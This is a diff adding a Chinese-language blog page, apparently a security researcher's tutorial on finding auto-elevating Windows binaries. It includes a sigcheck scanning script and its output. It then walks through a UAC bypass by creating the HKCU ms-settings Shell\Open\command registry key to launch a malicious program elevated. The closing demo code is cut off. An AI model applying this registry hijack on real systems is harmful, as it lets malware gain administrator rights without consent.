@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="UAC白名单挖掘用户帐户控制(User Account Control)是Windows Vista（及更高版本操作系统）中一组新的基础结构技 术，可以帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统，同时也可以帮助组织部署更易于管理 的平台 使用UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员 级别的访问权限时除外。UAC会阻止未经授权应用程序的自动安装">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2024/10/08/UAC/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="UAC白名单挖掘用户帐户控制(User Account Control)是Windows Vista（及更高版本操作系统）中一组新的基础结构技 术，可以帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统，同时也可以帮助组织部署更易于管理 的平台 使用UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员 级别的访问权限时除外。UAC会阻止未经授权应用程序的自动安装">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002160839566.png">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002190357063.png">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002191236923.png">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002210139121.png">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002205338279.png">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002205633181.png">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002210212850.png">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002224655693.png">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241003164954753.png">
+<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241003165349834.png">
+<meta property="article:published_time" content="2024-10-08T03:50:54.560Z">
+<meta property="article:modified_time" content="2024-10-03T09:00:12.459Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002160839566.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Hexo</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/sergodeeva">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/10/08/Windows%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/10/08/SSDT%20Hook/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/08/UAC/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/08/UAC/&text="><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/08/UAC/&is_video=false&description="><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://example.com/2024/10/08/UAC/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/08/UAC/&name=&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UAC%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98"><span class="toc-number">1.</span> <span class="toc-text">UAC白名单挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VS2022%E9%87%8C%E9%9D%A2%E7%9A%84UAC"><span class="toc-number">1.0.1.</span> <span class="toc-text">VS2022里面的UAC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEUAC%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">寻找UAC白名单文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">验证</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Hexo</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2024-10-08T03:50:54.560Z" itemprop="datePublished">2024-10-08</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="UAC白名单挖掘"><a href="#UAC白名单挖掘" class="headerlink" title="UAC白名单挖掘"></a>UAC白名单挖掘</h1><p><strong>用户帐户控制</strong>(User Account Control)是Windows Vista（及更高版本操作系统）中一组新的基础结构技 术，可以帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统，同时也可以帮助组织部署更易于管理 的平台</p>
+<p>使用UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员 级别的访问权限时除外。UAC会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改</p>
+<h3 id="VS2022里面的UAC"><a href="#VS2022里面的UAC" class="headerlink" title="VS2022里面的UAC"></a>VS2022里面的UAC</h3><p>在visual studio里面有一个manifest文件，这个文件本质上是一个xml文件，用于标识当前应用程序的配 置属性，其中这几个级别明细如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aslnvoker 默认权限</span><br><span class="line">highestAvailable 最高权限</span><br><span class="line">requireAdministrator 必须是管理员权限</span><br></pre></td></tr></table></figure>
+
+<p>我们可以在链接器-&gt;清单文件里面找到UAC的执行级别，更改执行级别</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002160839566.png" alt="image-20241002160839566"></p>
+<h2 id="寻找UAC白名单文件"><a href="#寻找UAC白名单文件" class="headerlink" title="寻找UAC白名单文件"></a>寻找UAC白名单文件</h2><p>我们需要的UAC程序需要满足以下几个条件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 程序的manifest标识的配置属性 autoElevate 为 <span class="literal">true</span></span><br><span class="line"><span class="number">2.</span> 程序不弹出UAC弹窗</span><br><span class="line"><span class="number">3.</span> 从注册表里查询Shell\Open\command键值对</span><br></pre></td></tr></table></figure>
+
+<p>这里可以使用sigcheck64.exe这个文件来检查，微软有官方链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sigcheck 是一种命令行实用工具，可显示文件版本号、时间戳信息和数字签名详细信息（例如证书链）。 它还提供一个用于在 VirusTotal 上检查文件状态的选项、一个针对 40 多个防病毒引擎执行自动文件扫描的站点，以及一个用于上传文件以供扫描的选项。</span><br></pre></td></tr></table></figure>
+
+<p>这是我对虚拟机ComputerDefult.exe文件执行的结果</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Sigcheck v2.90 - File version and signature viewer</span><br><span class="line">Copyright (C) 2004-2022 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">c:\windows\system32\ComputerDefaults.exe:</span><br><span class="line">        Verified:       Signed</span><br><span class="line">        Signing date:   5:55 2024/9/6</span><br><span class="line">        Publisher:      Microsoft Windows</span><br><span class="line">        Company:        Microsoft Corporation</span><br><span class="line">        Description:    Set Program Access and Computer Defaults Control Panel</span><br><span class="line">        Product:        Microsoft?Windows?Operating System</span><br><span class="line">        Prod version:   10.0.22621.3527</span><br><span class="line">        File version:   10.0.22621.3527 (WinBuild.160101.0800)</span><br><span class="line">        MachineType:    64-bit</span><br><span class="line">        Manifest:</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Copyright (c) Microsoft Corporation --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">assembly</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span>  <span class="attr">xmlns:asmv3</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span> <span class="attr">manifestVersion</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">assemblyIdentity</span></span></span><br><span class="line"><span class="tag">  <span class="attr">processorArchitecture</span>=<span class="string">&quot;amd64&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">&quot;5.1.0.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">name</span>=<span class="string">&quot;Microsoft.Windows.ComputerDefaults&quot;</span> <span class="attr">type</span>=<span class="string">&quot;win32&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Set Program Access and Computer Defaults Control Panel<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependentAssembly</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">assemblyIdentity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;win32&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">name</span>=<span class="string">&quot;Microsoft.Windows.Common-Controls&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">version</span>=<span class="string">&quot;6.0.0.0&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">publicKeyToken</span>=<span class="string">&quot;6595b64144ccf1df&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">processorArchitecture</span>=<span class="string">&quot;amd64&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependentAssembly</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">trustInfo</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">requestedPrivileges</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">requestedExecutionLevel</span></span></span><br><span class="line"><span class="tag">                <span class="attr">level</span>=<span class="string">&quot;highestAvailable&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">uiAccess</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">requestedPrivileges</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">trustInfo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">asmv3:application</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">asmv3:windowsSettings</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">autoElevate</span>&gt;</span>true<span class="tag">&lt;/<span class="name">autoElevate</span>&gt;</span>///我们可以看见这个标签</span><br><span class="line">   <span class="tag">&lt;/<span class="name">asmv3:windowsSettings</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">asmv3:application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以通过管道符去过滤多余的信息</p>
+<p>这里有一个问题，一般的文件，微软是不会给这个标签，而且有些应用程序也不是每个环境里都有</p>
+<p>那么我们应该去哪里找这些带标签的exe文件呢</p>
+<p>一般电脑上C盘里面都有<strong>User（不过每个人名字不太一样），windows，Programme File 还有Programme File （x86）等</strong>。</p>
+<p>一个一个执行很麻烦，我们可以使用python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line">	path = <span class="string">&#x27;c:\windows\system32&#x27;</span></span><br><span class="line">	files = os.listdir(path)</span><br><span class="line">	<span class="built_in">print</span>(files)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetFileList</span>(<span class="params">path, fileList</span>):</span><br><span class="line">	newDir = path</span><br><span class="line">	<span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">		<span class="keyword">if</span> path[-<span class="number">4</span>:] == <span class="string">&#x27;.exe&#x27;</span>:</span><br><span class="line">			fileList.append(path)</span><br><span class="line">	<span class="keyword">elif</span> os.path.isdir(path):</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">for</span> s <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">				newDir=os.path.join(path,s)</span><br><span class="line">				GetFileList(newDir, fileList)</span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">return</span> fileList</span><br><span class="line">files = GetFileList(path, [])</span><br><span class="line"><span class="built_in">print</span>(files)</span><br><span class="line"><span class="keyword">for</span> eachFile <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">if</span> eachFile[-<span class="number">4</span>:] == <span class="string">&#x27;.exe&#x27;</span>:</span><br><span class="line">		command = <span class="string">r&#x27;.\sigcheck64.exe -m &#123;&#125; | findstr auto&#x27;</span>.<span class="built_in">format</span>(eachFile)</span><br><span class="line">		<span class="built_in">print</span>(command)</span><br><span class="line">		p1 = Popen(command, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27;</span> <span class="keyword">in</span> p1.stdout.read().decode(<span class="string">&#x27;gb2312&#x27;</span>):</span><br><span class="line">			copy_command = <span class="string">r&#x27;copy &#123;&#125; .\success&#x27;</span>.<span class="built_in">format</span>(eachFile)</span><br><span class="line">			Popen(copy_command, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE)</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(eachFile))</span><br><span class="line">			<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;success.txt&#x27;</span>, <span class="string">&#x27;at&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">				f.writelines(<span class="string">&#x27;&#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(eachFile))</span><br></pre></td></tr></table></figure>
+
+<p>这是我在虚拟机上执行后的结果</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\bthudtask.exe</span><br><span class="line">c:\windows\system32\changepk.exe</span><br><span class="line">c:\windows\system32\ComputerDefaults.exe</span><br><span class="line">c:\windows\system32\dccw.exe</span><br><span class="line">c:\windows\system32\dcomcnfg.exe</span><br><span class="line">c:\windows\system32\DeviceEject.exe</span><br><span class="line">c:\windows\system32\DeviceProperties.exe</span><br><span class="line">c:\windows\system32\djoin.exe</span><br><span class="line">c:\windows\system32\easinvoker.exe</span><br><span class="line">c:\windows\system32\EASPolicyManagerBrokerHost.exe</span><br><span class="line">c:\windows\system32\eudcedit.exe</span><br><span class="line">c:\windows\system32\eventvwr.exe</span><br><span class="line">c:\windows\system32\fodhelper.exe</span><br><span class="line">c:\windows\system32\fsquirt.exe</span><br><span class="line">c:\windows\system32\immersivetpmvscmgrsvr.exe</span><br><span class="line">c:\windows\system32\iscsicli.exe</span><br><span class="line">c:\windows\system32\iscsicpl.exe</span><br><span class="line">c:\windows\system32\lpksetup.exe</span><br><span class="line">c:\windows\system32\MSchedExe.exe</span><br><span class="line">c:\windows\system32\msconfig.exe</span><br><span class="line">c:\windows\system32\msra.exe</span><br><span class="line">c:\windows\system32\MultiDigiMon.exe</span><br><span class="line">c:\windows\system32\newdev.exe</span><br><span class="line">c:\windows\system32\odbcad32.exe</span><br><span class="line">c:\windows\system32\PasswordOnWakeSettingFlyout.exe</span><br><span class="line">c:\windows\system32\recdisc.exe</span><br><span class="line">c:\windows\system32\rrinstaller.exe</span><br><span class="line">c:\windows\system32\shrpubw.exe</span><br><span class="line">c:\windows\system32\slui.exe</span><br><span class="line">c:\windows\system32\Sysprep\sysprep.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesAdvanced.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesComputerName.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesDataExecutionPrevention.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesHardware.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesPerformance.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesProtection.exe</span><br><span class="line">c:\windows\system32\SystemPropertiesRemote.exe</span><br><span class="line">c:\windows\system32\SystemSettingsAdminFlows.exe</span><br><span class="line">c:\windows\system32\SystemSettingsRemoveDevice.exe</span><br><span class="line">c:\windows\system32\Taskmgr.exe</span><br><span class="line">c:\windows\system32\tcmsetup.exe</span><br><span class="line">c:\windows\system32\TpmInit.exe</span><br><span class="line">c:\windows\system32\WindowsUpdateElevatedInstaller.exe</span><br><span class="line">c:\windows\system32\WSReset.exe</span><br><span class="line">c:\windows\system32\wusa.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>这里我们还是以ComputerDefaults.exe为例，我们使用Process Monitor去监视程序启动的事件，在启动的一瞬间我们可以看见出现了很多事件</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002190357063.png" alt="image-20241002190357063"></p>
+<p>设置过滤条件，这里我们需要寻找的是RegOpenKey，因为它可以打开注册表项，继承我们软件的权限</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS <span class="title function_">RegOpenKeyA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]           HKEY   hKey,</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR lpSubKey,</span></span><br><span class="line"><span class="params">  [out]          PHKEY  phkResult</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里也就对应了我们上面要求的第三点，<strong>3. 从注册表里查询Shell\Open\command键值对</strong>，因为这样一个打开注册表的操作，能帮我们起一个带权限的cmd，向下继续搜索</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002191236923.png" alt="image-20241002191236923"></p>
+<p>这里有一个小tips，我们寻找键值还有一个注意点，最好寻找Result处为Name No Found的键值，因为如果我们找到了一个Success的键值，证明这是被程序正常访问的，那么我们对其进行修改就很有可能会影响到程序正常启动</p>
+<p>我们可以看程序查找dll的完整路径HKCU\Software\Classes\ms-settings\Shell\Open\command</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002210139121.png" alt="image-20241002210139121"></p>
+<p>除了HKCU其他几个键值表修改要管理员权限</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002205338279.png" alt="image-20241002205338279"></p>
+<p>我们按照路径找，但是在路径里面只能找到classes这一级</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002205633181.png" alt="image-20241002205633181"></p>
+<p>所以我们新建剩下的表项</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002210212850.png" alt="image-20241002210212850"></p>
+<p>不过我做这个复现的时候，貌似已经修了</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002224655693.png" alt="image-20241002224655693"></p>
+<p>为什么知道修了呢，我们所需的DelegateExecute在我的win版本中</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241003164954753.png" alt="image-20241003164954753"></p>
+<p>以及我的虚拟机版本中</p>
+<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241003165349834.png" alt="image-20241003165349834"></p>
+<p>相关注册表的值已经由HKCU改为了HKCR，这意味着我们在执行RegQueryValue时需要使用更高的权限，这就失去了UAC注册表劫持来提权的意义</p>
+<p>![2b720574465180445fd8468c34bf2c4](C:\Users\su\Documents\WeChat Files\wxid_pfbd0i5dynxu22\FileStorage\Temp\2b720574465180445fd8468c34bf2c4.png)</p>
+<p>但是思路还是有参考价值的</p>
+<p><strong>找到能够指向文件路径并打开的键值，然后修改它的值指向我们的恶意程序</strong></p>
+<p>这里还是给出一个老demo作为结束</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 